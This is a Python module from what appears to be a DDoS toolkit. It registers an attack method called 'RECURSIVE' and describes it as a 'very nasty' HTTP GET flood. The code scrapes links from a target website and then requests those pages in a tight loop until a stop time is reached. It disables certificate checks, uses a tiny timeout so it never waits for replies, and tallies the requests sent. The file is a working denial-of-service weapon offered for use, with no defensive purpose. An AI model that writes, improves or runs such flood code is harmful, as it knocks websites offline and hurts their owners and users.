'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import time, requests
from random import choice
from urllib.parse import urlparse
from src.core import Core
from src.utils import *
from src.useragent import *

def scrapeurls(target_url, page) -> list:
    '''
    Scrapes all the urls off a page
    '''

    urls = []
    urls_found = re.findall('''(href|src)=["'](.[^"']+)["']''', page)

    if urls_found:
        for url in urls_found:
            url = url[1]
            if not url in urls and (urlparse(target_url).netloc in url or url.startswith('/')):
                urls.append(url.replace(target_url, ''))

    return urls

def flood(attack_id, url, stoptime) -> None:

    urls = []
    if not Core.recursive_urls: # no urls have been scraped yet
        try:
            urls += scrapeurls(url, Core.session.get(url, headers=utils().buildheaders(url)).text) # append the scraped urls
        except Exception:
            urls += [f'{url.strip("/")}/robots.txt',f'{url.strip("/")}/index.html',f'{url.strip("/")}/favicon.ico']
        
        if urls == []: # no urls found? just add some random urls
            urls += [f'{url.strip("/")}/robots.txt',f'{url.strip("/")}/index.html',f'{url.strip("/")}/favicon.ico']

        Core.recursive_urls = urls

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        for target_url in Core.recursive_urls:
            try:
                req = Core.session.get(
                    target_url, 
                    headers=utils().buildheaders(target_url),
                    verify=False, 
                    timeout=(5,0.1), 
                    allow_redirects=False,
                    stream=False,
                    cert=None
                )

                Core.recursive_urls += scrapeurls(target_url, req.text) # scrape all urls from the requested page

                Core.infodict[attack_id]['req_sent'] += 1
            except requests.exceptions.ReadTimeout:
                Core.infodict[attack_id]['req_sent'] += 1

            except Exception:
                Core.infodict[attack_id]['req_fail'] += 1

            Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'RECURSIVE': {
        'info': 'Recursive HTTP GET flood, very nasty',
        'func': flood
    }
})